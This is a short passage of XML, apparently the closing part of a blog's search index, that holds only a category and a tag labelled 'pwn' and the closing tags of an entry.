      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
